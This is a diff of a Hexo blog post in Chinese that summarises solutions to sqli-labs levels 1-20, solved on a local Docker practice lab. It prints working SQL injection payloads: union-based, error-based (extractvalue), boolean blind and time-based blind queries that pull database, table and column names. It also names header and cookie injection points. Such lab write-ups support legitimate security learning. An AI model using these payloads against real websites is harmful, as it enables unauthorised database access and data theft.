@@ -1,37 +1,182 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    sqlilab做题总结（一） |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+  
+<link rel="stylesheet" href="/css/technology.css">
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+  
+  
+<script src="/js/pace.min.js"></script>
 
+<meta name="generator" content="Hexo 5.1.1"></head>
 
-{% block content %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-sqlilab做题总结（一）" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqlilab做题总结（一）
+    </h1>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
-    </div>
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2020-08-28T02:42:36.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
 
-{% endblock %}
+      </div>
+    
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <div class="article-entry" itemprop="articleBody">
+      
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+      
+
+      
+        <h2 id="sqlilab做题总结（一）"><a href="#sqlilab做题总结（一）" class="headerlink" title="sqlilab做题总结（一）"></a>sqlilab做题总结（一）</h2><p>开始重新系统学习sql注入，本地docker搭建了一个sqlilab的靶场，今天先搞1-20.</p>
+<h5 id="Less1-4"><a href="#Less1-4" class="headerlink" title="Less1-4"></a>Less1-4</h5><p>Less1-4是最简单的四种情况，采用最基本的联合查询注入即可完成。注意不同的引号/括号闭合方式。主要有Less1:单引号闭合型，Less2:无任何引号or括号(数字型)，Less3:单引号加括号，Less4:双引号加括号。</p>
+<p>主要注入payload(以Less1为例)：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 判断显示位，本题为3列，其中第二列为Login name,第三列为password</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 数据库名</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>),<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 数据表名</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>),<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Less5-10"><a href="#Less5-10" class="headerlink" title="Less5-10"></a>Less5-10</h5><p>这六个题主要考察报错注入和盲注(当然也可以全部盲注)，同样注意引号/括号闭合方式的不同。</p>
+<p>Less5-6可以采用extractvalue,updatexml进行报错注入：(以Less5为例)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(&#x27;asdfasdf&#x27;, concat(&#x27;~&#x27;, (<span class="keyword">select</span> <span class="keyword">database</span>())))) %<span class="number">23</span> <span class="comment"># 数据库名</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(&#x27;asdfasdf&#x27;, concat(&#x27;~&#x27;, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>)))) %<span class="number">23</span> <span class="comment"># 数据表名</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(&#x27;asdfasdf&#x27;, concat(&#x27;~&#x27;, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>)))) %<span class="number">23</span> <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>
+
+<p>Less7-8可以采用布尔盲注，写脚本完成。主要借助ascii()函数，substr()等字符串处理函数，if，case when等条件语句，通过对某个目标项的某一位是否等于某个值来进行判断。</p>
+<p>以less7为例(注意闭合方式为<code>&#39;))</code>,通过修改start和value的值，一位一位判断database()返回的字符串的每一位的字符是什么，从而达到获取结果的目的。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))and if(ascii(substr(database(),&#123;start&#125;,1))=&#123;value&#125;,1,0) %23 # 数据库名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="number">1</span>,<span class="number">0</span>) %<span class="number">23</span> <span class="comment"># 表名</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="number">1</span>,<span class="number">0</span>) %<span class="number">23</span>   <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>
+
+<p>Less9-10采用时间盲注，思路与7，8相似，不过这次改成了通过判断网页响应时间长短来确定我们盲注的结果是否正确。具体方法即如果判断正确则延迟5秒返回，如果判断错误则立即返回。</p>
+<p>以Less9为例：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),&#123;start&#125;,1))=&#123;value&#125;,sleep(5),0) %23 # 数据库名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">0</span>) %<span class="number">23</span> <span class="comment"># 表名</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">0</span>) %<span class="number">23</span>   <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Less11-14"><a href="#Less11-14" class="headerlink" title="Less11-14"></a>Less11-14</h5><p>Less11-14均可采用联合查询注入的形式(username框)，只不过变成了post，注意闭合方式和列数，具体不再赘述。</p>
+<h5 id="Less15-16"><a href="#Less15-16" class="headerlink" title="Less15-16"></a>Less15-16</h5><p>同Less7-8,采用布尔盲注完成(username框)。</p>
+<h5 id="Less17-20"><a href="#Less17-20" class="headerlink" title="Less17-20"></a>Less17-20</h5><p>Less17:username框经过测试发现存在转义，无法注入，但password框可以，虽然是update语句，同理直接闭合引号随后报错注入即可。</p>
+<p>Less18:本题username框和password框全部存在转义，根据题目提示User-Agent请求头可以进行注入，故尝试User-Agent处闭合单引号随后报错注入。</p>
+<p>Less19:本题提示Referer，故尝试Referer处报错注入即可。</p>
+<p>Less20:本题提示Cookie，观察Cookie形式后尝试Cookie处报错注入即可。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://su29029.github.io/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckedortlx000vxitygrii7344"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            sqlilab做题总结（二）
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/28/Python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98-cnvd%E7%BD%91%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Python爬虫学习与实战(cnvd网信息爬取)</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
